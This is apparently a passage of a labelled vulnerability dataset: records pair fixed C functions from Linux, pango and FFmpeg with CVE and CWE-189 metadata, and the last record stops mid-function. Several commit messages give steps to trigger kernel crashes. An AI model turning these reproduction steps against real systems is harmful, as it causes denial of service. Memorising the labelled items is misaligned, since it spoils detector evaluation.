{"idx": 158423, "project": "pango", "commit_id": "4de30e5500eaeb49f4bf0b7a07f718e149a2ed5e", "project_url": "http://github.com/bratsche/pango", "commit_url": "http://github.com/bratsche/pango/commit/4de30e5500eaeb49f4bf0b7a07f718e149a2ed5e", "commit_message": "[glyphstring] Handle overflow with very long glyphstrings", "target": 0, "func": "pango_glyph_string_set_size (PangoGlyphString *string, gint new_len)\n{\n  g_return_if_fail (new_len >= 0);\n\n   while (new_len > string->space)\n     {\n       if (string->space == 0)\n\t{\n\t  string->space = 4;\n\t}\n       else\n \t{\n\t  const guint max_space =\n\t    MIN (G_MAXINT, G_MAXSIZE / MAX (sizeof(PangoGlyphInfo), sizeof(gint)));\n\n\t  guint more_space = (guint)string->space * 2;\n\n\t  if (more_space > max_space)\n\t    {\n\t      more_space = max_space;\n\n\t      if ((guint)new_len > max_space)\n\t\t{\n\t\t  g_error (\"%s: failed to allocate glyph string of length %i\\n\",\n\t\t\t   G_STRLOC, new_len);\n\t\t}\n\t    }\n\n\t  string->space = more_space;\n \t}\n     }\n \n  string->glyphs = g_realloc (string->glyphs, string->space * sizeof (PangoGlyphInfo));\n  string->log_clusters = g_realloc (string->log_clusters, string->space * sizeof (gint));\n  string->num_glyphs = new_len;\n}\n", "func_hash": 105000942649568510308417598702037083919, "file_name": "glyphstring.c", "file_hash": 150455093204162127295659906057228748143, "cwe": ["CWE-189"], "cve": "CVE-2009-1194", "cve_desc": "Integer overflow in the pango_glyph_string_set_size function in pango/glyphstring.c in Pango before 1.24 allows context-dependent attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a long glyph string that triggers a heap-based buffer overflow, as demonstrated by a long document.location value in Firefox.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-1194"}
{"idx": 158432, "project": "linux", "commit_id": "8f363b77ee4fbf7c3bbcf5ec2c5ca482d396d664", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/8f363b77ee4fbf7c3bbcf5ec2c5ca482d396d664", "commit_message": "net: fix divide by zero in tcp algorithm illinois\n\nReading TCP stats when using TCP Illinois congestion control algorithm\ncan cause a divide by zero kernel oops.\n\nThe division by zero occur in tcp_illinois_info() at:\n do_div(t, ca->cnt_rtt);\nwhere ca->cnt_rtt can become zero (when rtt_reset is called)\n\nSteps to Reproduce:\n 1. Register tcp_illinois:\n     # sysctl -w net.ipv4.tcp_congestion_control=illinois\n 2. Monitor internal TCP information via command \"ss -i\"\n     # watch -d ss -i\n 3. Establish new TCP conn to machine\n\nEither it fails at the initial conn, or else it needs to wait\nfor a loss or a reset.\n\nThis is only related to reading stats.  The function avg_delay() also\nperforms the same divide, but is guarded with a (ca->cnt_rtt > 0) at its\ncalling point in update_params().  Thus, simply fix tcp_illinois_info().\n\nFunction tcp_illinois_info() / get_info() is called without\nsocket lock.  Thus, eliminate any race condition on ca->cnt_rtt\nby using a local stack variable.  Simply reuse info.tcpv_rttcnt,\nas its already set to ca->cnt_rtt.\nFunction avg_delay() is not affected by this race condition, as\nits called with the socket lock.\n\nCc: Petr Matousek <pmatouse@redhat.com>\nSigned-off-by: Jesper Dangaard Brouer <brouer@redhat.com>\nAcked-by: Eric Dumazet <edumazet@google.com>\nAcked-by: Stephen Hemminger <shemminger@vyatta.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 0, "func": "static void tcp_illinois_info(struct sock *sk, u32 ext,\n\t\t\t      struct sk_buff *skb)\n{\n\tconst struct illinois *ca = inet_csk_ca(sk);\n\n\tif (ext & (1 << (INET_DIAG_VEGASINFO - 1))) {\n\t\tstruct tcpvegas_info info = {\n\t\t\t.tcpv_enabled = 1,\n \t\t\t.tcpv_rttcnt = ca->cnt_rtt,\n \t\t\t.tcpv_minrtt = ca->base_rtt,\n \t\t};\n \n\t\tif (info.tcpv_rttcnt > 0) {\n\t\t\tu64 t = ca->sum_rtt;\n \n\t\t\tdo_div(t, info.tcpv_rttcnt);\n\t\t\tinfo.tcpv_rtt = t;\n\t\t}\n \t\tnla_put(skb, INET_DIAG_VEGASINFO, sizeof(info), &info);\n \t}\n }\n", "func_hash": 265905920719259825673748213632149738414, "file_name": "tcp_illinois.c", "file_hash": 332081189501460947256009267484504104074, "cwe": ["CWE-189"], "cve": "CVE-2012-4565", "cve_desc": "The tcp_illinois_info function in net/ipv4/tcp_illinois.c in the Linux kernel before 3.4.19, when the net.ipv4.tcp_congestion_control illinois setting is enabled, allows local users to cause a denial of service (divide-by-zero error and OOPS) by reading TCP stats.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-4565"}
{"idx": 158484, "project": "linux", "commit_id": "20e0fa98b751facf9a1101edaefbc19c82616a68", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/20e0fa98b751facf9a1101edaefbc19c82616a68", "commit_message": "Fix length of buffer copied in __nfs4_get_acl_uncached\n\n_copy_from_pages() used to copy data from the temporary buffer to the\nuser passed buffer is passed the wrong size parameter when copying\ndata. res.acl_len contains both the bitmap and acl lenghts while\nacl_len contains the acl length after adjusting for the bitmap size.\n\nSigned-off-by: Sachin Prabhu <sprabhu@redhat.com>\nSigned-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>", "target": 0, "func": "static ssize_t __nfs4_get_acl_uncached(struct inode *inode, void *buf, size_t buflen)\n{\n\tstruct page *pages[NFS4ACL_MAXPAGES] = {NULL, };\n\tstruct nfs_getaclargs args = {\n\t\t.fh = NFS_FH(inode),\n\t\t.acl_pages = pages,\n\t\t.acl_len = buflen,\n\t};\n\tstruct nfs_getaclres res = {\n\t\t.acl_len = buflen,\n\t};\n\tvoid *resp_buf;\n\tstruct rpc_message msg = {\n\t\t.rpc_proc = &nfs4_procedures[NFSPROC4_CLNT_GETACL],\n\t\t.rpc_argp = &args,\n\t\t.rpc_resp = &res,\n\t};\n\tint ret = -ENOMEM, npages, i, acl_len = 0;\n\n\tnpages = (buflen + PAGE_SIZE - 1) >> PAGE_SHIFT;\n\t/* As long as we're doing a round trip to the server anyway,\n\t * let's be prepared for a page of acl data. */\n\tif (npages == 0)\n\t\tnpages = 1;\n\n\tfor (i = 0; i < npages; i++) {\n\t\tpages[i] = alloc_page(GFP_KERNEL);\n\t\tif (!pages[i])\n\t\t\tgoto out_free;\n\t}\n\tif (npages > 1) {\n\t\t/* for decoding across pages */\n\t\tres.acl_scratch = alloc_page(GFP_KERNEL);\n\t\tif (!res.acl_scratch)\n\t\t\tgoto out_free;\n\t}\n\targs.acl_len = npages * PAGE_SIZE;\n\targs.acl_pgbase = 0;\n\t/* Let decode_getfacl know not to fail if the ACL data is larger than\n\t * the page we send as a guess */\n\tif (buf == NULL)\n\t\tres.acl_flags |= NFS4_ACL_LEN_REQUEST;\n\tresp_buf = page_address(pages[0]);\n\n\tdprintk(\"%s  buf %p buflen %zu npages %d args.acl_len %zu\\n\",\n\t\t__func__, buf, buflen, npages, args.acl_len);\n\tret = nfs4_call_sync(NFS_SERVER(inode)->client, NFS_SERVER(inode),\n\t\t\t     &msg, &args.seq_args, &res.seq_res, 0);\n\tif (ret)\n\t\tgoto out_free;\n\n\tacl_len = res.acl_len - res.acl_data_offset;\n\tif (acl_len > args.acl_len)\n\t\tnfs4_write_cached_acl(inode, NULL, acl_len);\n\telse\n\t\tnfs4_write_cached_acl(inode, resp_buf + res.acl_data_offset,\n\t\t\t\t      acl_len);\n\tif (buf) {\n\t\tret = -ERANGE;\n \t\tif (acl_len > buflen)\n \t\t\tgoto out_free;\n \t\t_copy_from_pages(buf, pages, res.acl_data_offset,\n\t\t\t\tacl_len);\n \t}\n \tret = acl_len;\n out_free:\n\tfor (i = 0; i < npages; i++)\n\t\tif (pages[i])\n\t\t\t__free_page(pages[i]);\n\tif (res.acl_scratch)\n\t\t__free_page(res.acl_scratch);\n\treturn ret;\n}\n", "func_hash": 256388573553531103653804341946158021308, "file_name": "nfs4proc.c", "file_hash": 10126859884048499971925131395599891848, "cwe": ["CWE-189"], "cve": "CVE-2012-2375", "cve_desc": "The __nfs4_get_acl_uncached function in fs/nfs/nfs4proc.c in the NFSv4 implementation in the Linux kernel before 3.3.2 uses an incorrect length variable during a copy operation, which allows remote NFS servers to cause a denial of service (OOPS) by sending an excessive number of bitmap words in an FATTR4_ACL reply.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-4131.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-2375"}
{"idx": 158495, "project": "linux", "commit_id": "d50f2ab6f050311dbf7b8f5501b25f0bf64a439b", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/d50f2ab6f050311dbf7b8f5501b25f0bf64a439b", "commit_message": "ext4: fix undefined behavior in ext4_fill_flex_info()\n\nCommit 503358ae01b70ce6909d19dd01287093f6b6271c (\"ext4: avoid divide by\nzero when trying to mount a corrupted file system\") fixes CVE-2009-4307\nby performing a sanity check on s_log_groups_per_flex, since it can be\nset to a bogus value by an attacker.\n\n\tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;\n\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n\n\tif (groups_per_flex < 2) { ... }\n\nThis patch fixes two potential issues in the previous commit.\n\n1) The sanity check might only work on architectures like PowerPC.\nOn x86, 5 bits are used for the shifting amount.  That means, given a\nlarge s_log_groups_per_flex value like 36, groups_per_flex = 1 << 36\nis essentially 1 << 4 = 16, rather than 0.  This will bypass the check,\nleaving s_log_groups_per_flex and groups_per_flex inconsistent.\n\n2) The sanity check relies on undefined behavior, i.e., oversized shift.\nA standard-confirming C compiler could rewrite the check in unexpected\nways.  Consider the following equivalent form, assuming groups_per_flex\nis unsigned for simplicity.\n\n\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n\tif (groups_per_flex == 0 || groups_per_flex == 1) {\n\nWe compile the code snippet using Clang 3.0 and GCC 4.6.  Clang will\ncompletely optimize away the check groups_per_flex == 0, leaving the\npatched code as vulnerable as the original.  GCC keeps the check, but\nthere is no guarantee that future versions will do the same.\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>\nCc: stable@vger.kernel.org", "target": 0, "func": "static int ext4_fill_flex_info(struct super_block *sb)\n{\n\tstruct ext4_sb_info *sbi = EXT4_SB(sb);\n \tstruct ext4_group_desc *gdp = NULL;\n \text4_group_t flex_group_count;\n \text4_group_t flex_group;\n\tunsigned int groups_per_flex = 0;\n \tsize_t size;\n \tint i;\n \n \tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;\n\tif (sbi->s_log_groups_per_flex < 1 || sbi->s_log_groups_per_flex > 31) {\n \t\tsbi->s_log_groups_per_flex = 0;\n \t\treturn 1;\n \t}\n\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n \n \t/* We allocate both existing and potentially added groups */\n \tflex_group_count = ((sbi->s_groups_count + groups_per_flex - 1) +\n\t\t\t((le16_to_cpu(sbi->s_es->s_reserved_gdt_blocks) + 1) <<\n\t\t\t      EXT4_DESC_PER_BLOCK_BITS(sb))) / groups_per_flex;\n\tsize = flex_group_count * sizeof(struct flex_groups);\n\tsbi->s_flex_groups = ext4_kvzalloc(size, GFP_KERNEL);\n\tif (sbi->s_flex_groups == NULL) {\n\t\text4_msg(sb, KERN_ERR, \"not enough memory for %u flex groups\",\n\t\t\t flex_group_count);\n\t\tgoto failed;\n\t}\n\n\tfor (i = 0; i < sbi->s_groups_count; i++) {\n\t\tgdp = ext4_get_group_desc(sb, i, NULL);\n\n\t\tflex_group = ext4_flex_group(sbi, i);\n\t\tatomic_add(ext4_free_inodes_count(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].free_inodes);\n\t\tatomic_add(ext4_free_group_clusters(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].free_clusters);\n\t\tatomic_add(ext4_used_dirs_count(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].used_dirs);\n\t}\n\n\treturn 1;\nfailed:\n\treturn 0;\n}\n", "func_hash": 118842164670602799055222836749851621520, "file_name": "super.c", "file_hash": 153991305486688530062822027651828903748, "cwe": ["CWE-189"], "cve": "CVE-2012-2100", "cve_desc": "The ext4_fill_flex_info function in fs/ext4/super.c in the Linux kernel before 3.2.2, on the x86 platform and unspecified other platforms, allows user-assisted remote attackers to trigger inconsistent filesystem-groups data and possibly cause a denial of service via a malformed ext4 filesystem containing a super block with a large FLEX_BG group size (aka s_log_groups_per_flex value).  NOTE: this vulnerability exists because of an incomplete fix for CVE-2009-4307.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-2100"}
{"idx": 158519, "project": "linux", "commit_id": "a5cd335165e31db9dbab636fd29895d41da55dd2", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/a5cd335165e31db9dbab636fd29895d41da55dd2", "commit_message": "drm: integer overflow in drm_mode_dirtyfb_ioctl()\n\nThere is a potential integer overflow in drm_mode_dirtyfb_ioctl()\nif userspace passes in a large num_clips.  The call to kmalloc would\nallocate a small buffer, and the call to fb->funcs->dirty may result\nin a memory corruption.\n\nReported-by: Haogang Chen <haogangchen@gmail.com>\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nCc: stable@kernel.org\nSigned-off-by: Dave Airlie <airlied@redhat.com>", "target": 0, "func": "int drm_mode_dirtyfb_ioctl(struct drm_device *dev,\n\t\t\t   void *data, struct drm_file *file_priv)\n{\n\tstruct drm_clip_rect __user *clips_ptr;\n\tstruct drm_clip_rect *clips = NULL;\n\tstruct drm_mode_fb_dirty_cmd *r = data;\n\tstruct drm_mode_object *obj;\n\tstruct drm_framebuffer *fb;\n\tunsigned flags;\n\tint num_clips;\n\tint ret = 0;\n\n\tif (!drm_core_check_feature(dev, DRIVER_MODESET))\n\t\treturn -EINVAL;\n\n\tmutex_lock(&dev->mode_config.mutex);\n\tobj = drm_mode_object_find(dev, r->fb_id, DRM_MODE_OBJECT_FB);\n\tif (!obj) {\n\t\tDRM_ERROR(\"invalid framebuffer id\\n\");\n\t\tret = -EINVAL;\n\t\tgoto out_err1;\n\t}\n\tfb = obj_to_fb(obj);\n\n\tnum_clips = r->num_clips;\n\tclips_ptr = (struct drm_clip_rect *)(unsigned long)r->clips_ptr;\n\n\tif (!num_clips != !clips_ptr) {\n\t\tret = -EINVAL;\n\t\tgoto out_err1;\n\t}\n\n\tflags = DRM_MODE_FB_DIRTY_FLAGS & r->flags;\n\n\t/* If userspace annotates copy, clips must come in pairs */\n\tif (flags & DRM_MODE_FB_DIRTY_ANNOTATE_COPY && (num_clips % 2)) {\n\t\tret = -EINVAL;\n\t\tgoto out_err1;\n \t}\n \n \tif (num_clips && clips_ptr) {\n\t\tif (num_clips < 0 || num_clips > DRM_MODE_FB_DIRTY_MAX_CLIPS) {\n\t\t\tret = -EINVAL;\n\t\t\tgoto out_err1;\n\t\t}\n \t\tclips = kzalloc(num_clips * sizeof(*clips), GFP_KERNEL);\n \t\tif (!clips) {\n \t\t\tret = -ENOMEM;\n\t\t\tgoto out_err1;\n\t\t}\n\n\t\tret = copy_from_user(clips, clips_ptr,\n\t\t\t\t     num_clips * sizeof(*clips));\n\t\tif (ret) {\n\t\t\tret = -EFAULT;\n\t\t\tgoto out_err2;\n\t\t}\n\t}\n\n\tif (fb->funcs->dirty) {\n\t\tret = fb->funcs->dirty(fb, file_priv, flags, r->color,\n\t\t\t\t       clips, num_clips);\n\t} else {\n\t\tret = -ENOSYS;\n\t\tgoto out_err2;\n\t}\n\nout_err2:\n\tkfree(clips);\nout_err1:\n\tmutex_unlock(&dev->mode_config.mutex);\n\treturn ret;\n}\n", "func_hash": 72844617414097371511584998420562300996, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2012-0044", "cve_desc": "Integer overflow in the drm_mode_dirtyfb_ioctl function in drivers/gpu/drm/drm_crtc.c in the Direct Rendering Manager (DRM) subsystem in the Linux kernel before 3.1.5 allows local users to gain privileges or cause a denial of service (memory corruption) via a crafted ioctl call.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-0044"}
{"idx": 158585, "project": "linux", "commit_id": "56c6a8a4aadca809e04276eabe5552935c51387f", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/56c6a8a4aadca809e04276eabe5552935c51387f", "commit_message": "None", "target": 0, "func": " unsigned int oom_badness(struct task_struct *p, struct mem_cgroup *mem,\n \t\t      const nodemask_t *nodemask, unsigned long totalpages)\n {\n\tlong points;\n \n \tif (oom_unkillable_task(p, mem, nodemask))\n \t\treturn 0;\n\n\tp = find_lock_task_mm(p);\n\tif (!p)\n\t\treturn 0;\n\n\t/*\n\t * Shortcut check for a thread sharing p->mm that is OOM_SCORE_ADJ_MIN\n\t * so the entire heuristic doesn't need to be executed for something\n\t * that cannot be killed.\n\t */\n\tif (atomic_read(&p->mm->oom_disable_count)) {\n\t\ttask_unlock(p);\n\t\treturn 0;\n\t}\n\n\t/*\n\t * The memory controller may have a limit of 0 bytes, so avoid a divide\n\t * by zero, if necessary.\n\t */\n\tif (!totalpages)\n\t\ttotalpages = 1;\n\n\t/*\n\t * The baseline for the badness score is the proportion of RAM that each\n\t * task's rss, pagetable and swap space use.\n\t */\n\tpoints = get_mm_rss(p->mm) + p->mm->nr_ptes;\n\tpoints += get_mm_counter(p->mm, MM_SWAPENTS);\n\n\tpoints *= 1000;\n\tpoints /= totalpages;\n\ttask_unlock(p);\n\n\t/*\n\t * Root processes get 3% bonus, just like the __vm_enough_memory()\n\t * implementation used by LSMs.\n\t */\n\tif (has_capability_noaudit(p, CAP_SYS_ADMIN))\n\t\tpoints -= 30;\n\n\t/*\n\t * /proc/pid/oom_score_adj ranges from -1000 to +1000 such that it may\n\t * either completely disable oom killing or always prefer a certain\n\t * task.\n\t */\n\tpoints += p->signal->oom_score_adj;\n\n\t/*\n\t * Never return 0 for an eligible task that may be killed since it's\n\t * possible that no single user task uses more than 0.1% of memory and\n\t * no single admin tasks uses more than 3.0%.\n\t */\n\tif (points <= 0)\n\t\treturn 1;\n\treturn (points < 1000) ? points : 1000;\n}\n", "func_hash": 272130603065112980321801198259609132059, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2011-4097", "cve_desc": "Integer overflow in the oom_badness function in mm/oom_kill.c in the Linux kernel before 3.1.8 on 64-bit platforms allows local users to cause a denial of service (memory consumption or process termination) by using a certain large amount of memory.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-4097"}
{"idx": 158733, "project": "FFmpeg", "commit_id": "86736f59d6a527d8bc807d09b93f971c0fe0bb07", "project_url": "https://github.com/FFmpeg/FFmpeg", "commit_url": "https://github.com/FFmpeg/FFmpeg/commit/86736f59d6a527d8bc807d09b93f971c0fe0bb07", "commit_message": "avcodec/pngdsp: fix (un)signed type in end comparission\n\nFixes out of array accesses\nFixes Ticket2919\n\nFound_by: ami_stuff\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>", "target": 0, "func": " static void add_bytes_l2_c(uint8_t *dst, uint8_t *src1, uint8_t *src2, int w)\n {\n     long i;\n    for (i = 0; i <= w - (int)sizeof(long); i += sizeof(long)) {\n         long a = *(long *)(src1 + i);\n         long b = *(long *)(src2 + i);\n         *(long *)(dst + i) = ((a & pb_7f) + (b & pb_7f)) ^ ((a ^ b) & pb_80);\n    }\n    for (; i < w; i++)\n        dst[i] = src1[i] + src2[i];\n}\n", "func_hash": 132338722680055218498024667163227574605, "file_name": "pngdsp.c", "file_hash": 77830949276076409414523976093444946089, "cwe": ["CWE-189"], "cve": "CVE-2013-7014", "cve_desc": "Integer signedness error in the add_bytes_l2_c function in libavcodec/pngdsp.c in FFmpeg before 2.1 allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted PNG data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-7014"}
{"idx": 158747, "project": "linux", "commit_id": "a497e47d4aec37aaf8f13509f3ef3d1f6a717d88", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/a497e47d4aec37aaf8f13509f3ef3d1f6a717d88", "commit_message": "libertas: potential oops in debugfs\n\nIf we do a zero size allocation then it will oops.  Also we can't be\nsure the user passes us a NUL terminated string so I've added a\nterminator.\n\nThis code can only be triggered by root.\n\nReported-by: Nico Golde <nico@ngolde.de>\nReported-by: Fabian Yamaguchi <fabs@goesec.de>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nAcked-by: Dan Williams <dcbw@redhat.com>\nSigned-off-by: John W. Linville <linville@tuxdriver.com>", "target": 0, "func": "static ssize_t lbs_debugfs_write(struct file *f, const char __user *buf,\n\t\t\t    size_t cnt, loff_t *ppos)\n{\n\tint r, i;\n\tchar *pdata;\n\tchar *p;\n\tchar *p0;\n\tchar *p1;\n \tchar *p2;\n \tstruct debug_data *d = f->private_data;\n \n\tif (cnt == 0)\n\t\treturn 0;\n\n\tpdata = kmalloc(cnt + 1, GFP_KERNEL);\n \tif (pdata == NULL)\n \t\treturn 0;\n \n\tif (copy_from_user(pdata, buf, cnt)) {\n\t\tlbs_deb_debugfs(\"Copy from user failed\\n\");\n \t\tkfree(pdata);\n \t\treturn 0;\n \t}\n\tpdata[cnt] = '\\0';\n \n \tp0 = pdata;\n \tfor (i = 0; i < num_of_items; i++) {\n\t\tdo {\n\t\t\tp = strstr(p0, d[i].name);\n\t\t\tif (p == NULL)\n\t\t\t\tbreak;\n\t\t\tp1 = strchr(p, '\\n');\n\t\t\tif (p1 == NULL)\n\t\t\t\tbreak;\n\t\t\tp0 = p1++;\n\t\t\tp2 = strchr(p, '=');\n\t\t\tif (!p2)\n\t\t\t\tbreak;\n\t\t\tp2++;\n\t\t\tr = simple_strtoul(p2, NULL, 0);\n\t\t\tif (d[i].size == 1)\n\t\t\t\t*((u8 *) d[i].addr) = (u8) r;\n\t\t\telse if (d[i].size == 2)\n\t\t\t\t*((u16 *) d[i].addr) = (u16) r;\n\t\t\telse if (d[i].size == 4)\n\t\t\t\t*((u32 *) d[i].addr) = (u32) r;\n\t\t\telse if (d[i].size == 8)\n\t\t\t\t*((u64 *) d[i].addr) = (u64) r;\n\t\t\tbreak;\n\t\t} while (1);\n\t}\n\tkfree(pdata);\n\n\treturn (ssize_t)cnt;\n}\n", "func_hash": 233211545593580187393050089721528796915, "file_name": "debugfs.c", "file_hash": 41257289586596894026698054176206077844, "cwe": ["CWE-189"], "cve": "CVE-2013-6378", "cve_desc": "The lbs_debugfs_write function in drivers/net/wireless/libertas/debugfs.c in the Linux kernel through 3.12.1 allows local users to cause a denial of service (OOPS) by leveraging root privileges for a zero-length write operation.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-6378"}
{"idx": 158748, "project": "linux", "commit_id": "17d68b763f09a9ce824ae23eb62c9efc57b69271", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/17d68b763f09a9ce824ae23eb62c9efc57b69271", "commit_message": "KVM: x86: fix guest-initiated crash with x2apic (CVE-2013-6376)\n\nA guest can cause a BUG_ON() leading to a host kernel crash.\nWhen the guest writes to the ICR to request an IPI, while in x2apic\nmode the following things happen, the destination is read from\nICR2, which is a register that the guest can control.\n\nkvm_irq_delivery_to_apic_fast uses the high 16 bits of ICR2 as the\ncluster id.  A BUG_ON is triggered, which is a protection against\naccessing map->logical_map with an out-of-bounds access and manages\nto avoid that anything really unsafe occurs.\n\nThe logic in the code is correct from real HW point of view. The problem\nis that KVM supports only one cluster with ID 0 in clustered mode, but\nthe code that has the bug does not take this into account.\n\nReported-by: Lars Bull <larsbull@google.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Gleb Natapov <gleb@redhat.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>", "target": 0, "func": " static void recalculate_apic_map(struct kvm *kvm)\n {\n \tstruct kvm_apic_map *new, *old = NULL;\n\tstruct kvm_vcpu *vcpu;\n\tint i;\n\n\tnew = kzalloc(sizeof(struct kvm_apic_map), GFP_KERNEL);\n\n\tmutex_lock(&kvm->arch.apic_map_lock);\n\n\tif (!new)\n\t\tgoto out;\n\n\tnew->ldr_bits = 8;\n\t/* flat mode is default */\n\tnew->cid_shift = 8;\n\tnew->cid_mask = 0;\n\tnew->lid_mask = 0xff;\n\n\tkvm_for_each_vcpu(i, vcpu, kvm) {\n\t\tstruct kvm_lapic *apic = vcpu->arch.apic;\n\t\tu16 cid, lid;\n\t\tu32 ldr;\n\n\t\tif (!kvm_apic_present(vcpu))\n\t\t\tcontinue;\n\n\t\t/*\n\t\t * All APICs have to be configured in the same mode by an OS.\n\t\t * We take advatage of this while building logical id loockup\n\t\t * table. After reset APICs are in xapic/flat mode, so if we\n\t\t * find apic with different setting we assume this is the mode\n\t\t * OS wants all apics to be in; build lookup table accordingly.\n\t\t */\n \t\tif (apic_x2apic_mode(apic)) {\n \t\t\tnew->ldr_bits = 32;\n \t\t\tnew->cid_shift = 16;\n\t\t\tnew->cid_mask = (1 << KVM_X2APIC_CID_BITS) - 1;\n\t\t\tnew->lid_mask = 0xffff;\n \t\t} else if (kvm_apic_sw_enabled(apic) &&\n \t\t\t\t!new->cid_mask /* flat mode */ &&\n \t\t\t\tkvm_apic_get_reg(apic, APIC_DFR) == APIC_DFR_CLUSTER) {\n\t\t\tnew->cid_shift = 4;\n\t\t\tnew->cid_mask = 0xf;\n\t\t\tnew->lid_mask = 0xf;\n\t\t}\n\n\t\tnew->phys_map[kvm_apic_id(apic)] = apic;\n\n\t\tldr = kvm_apic_get_reg(apic, APIC_LDR);\n\t\tcid = apic_cluster_id(new, ldr);\n\t\tlid = apic_logical_id(new, ldr);\n\n\t\tif (lid)\n\t\t\tnew->logical_map[cid][ffs(lid) - 1] = apic;\n\t}\nout:\n\told = rcu_dereference_protected(kvm->arch.apic_map,\n\t\t\tlockdep_is_held(&kvm->arch.apic_map_lock));\n\trcu_assign_pointer(kvm->arch.apic_map, new);\n\tmutex_unlock(&kvm->arch.apic_map_lock);\n\n\tif (old)\n\t\tkfree_rcu(old, rcu);\n\n\tkvm_vcpu_request_scan_ioapic(kvm);\n}\n", "func_hash": 255330493411169587262083220621426604364, "file_name": "lapic.c", "file_hash": 117888982784563867313503969523327524835, "cwe": ["CWE-189"], "cve": "CVE-2013-6376", "cve_desc": "The recalculate_apic_map function in arch/x86/kvm/lapic.c in the KVM subsystem in the Linux kernel through 3.12.5 allows guest OS users to cause a denial of service (host OS crash) via a crafted ICR write operation in x2apic mode.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-6376"}
{"idx": 158758, "project": "linux", "commit_id": "0e033e04c2678dbbe74a46b23fffb7bb918c288e", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/0e033e04c2678dbbe74a46b23fffb7bb918c288e", "commit_message": "ipv6: fix headroom calculation in udp6_ufo_fragment\n\nCommit 1e2bd517c108816220f262d7954b697af03b5f9c (\"udp6: Fix udp\nfragmentation for tunnel traffic.\") changed the calculation if\nthere is enough space to include a fragment header in the skb from a\nskb->mac_header dervived one to skb_headroom. Because we already peeled\noff the skb to transport_header this is wrong. Change this back to check\nif we have enough room before the mac_header.\n\nThis fixes a panic Saran Neti reported. He used the tbf scheduler which\nskb_gso_segments the skb. The offsets get negative and we panic in memcpy\nbecause the skb was erroneously not expanded at the head.\n\nReported-by: Saran Neti <Saran.Neti@telus.com>\nCc: Pravin B Shelar <pshelar@nicira.com>\nSigned-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 0, "func": "static struct sk_buff *udp6_ufo_fragment(struct sk_buff *skb,\n\t\t\t\t\t netdev_features_t features)\n{\n\tstruct sk_buff *segs = ERR_PTR(-EINVAL);\n\tunsigned int mss;\n\tunsigned int unfrag_ip6hlen, unfrag_len;\n\tstruct frag_hdr *fptr;\n\tu8 *packet_start, *prevhdr;\n\tu8 nexthdr;\n\tu8 frag_hdr_sz = sizeof(struct frag_hdr);\n\tint offset;\n\t__wsum csum;\n\tint tnl_hlen;\n\n\tmss = skb_shinfo(skb)->gso_size;\n\tif (unlikely(skb->len <= mss))\n\t\tgoto out;\n\n\tif (skb_gso_ok(skb, features | NETIF_F_GSO_ROBUST)) {\n\t\t/* Packet is from an untrusted source, reset gso_segs. */\n\t\tint type = skb_shinfo(skb)->gso_type;\n\n\t\tif (unlikely(type & ~(SKB_GSO_UDP |\n\t\t\t\t      SKB_GSO_DODGY |\n\t\t\t\t      SKB_GSO_UDP_TUNNEL |\n\t\t\t\t      SKB_GSO_GRE |\n\t\t\t\t      SKB_GSO_IPIP |\n\t\t\t\t      SKB_GSO_SIT |\n\t\t\t\t      SKB_GSO_MPLS) ||\n\t\t\t     !(type & (SKB_GSO_UDP))))\n\t\t\tgoto out;\n\n\t\tskb_shinfo(skb)->gso_segs = DIV_ROUND_UP(skb->len, mss);\n\n\t\tsegs = NULL;\n\t\tgoto out;\n\t}\n\n\tif (skb->encapsulation && skb_shinfo(skb)->gso_type & SKB_GSO_UDP_TUNNEL)\n\t\tsegs = skb_udp_tunnel_segment(skb, features);\n\telse {\n\t\t/* Do software UFO. Complete and fill in the UDP checksum as HW cannot\n\t\t * do checksum of UDP packets sent as multiple IP fragments.\n\t\t */\n\t\toffset = skb_checksum_start_offset(skb);\n\t\tcsum = skb_checksum(skb, offset, skb->len - offset, 0);\n\t\toffset += skb->csum_offset;\n\t\t*(__sum16 *)(skb->data + offset) = 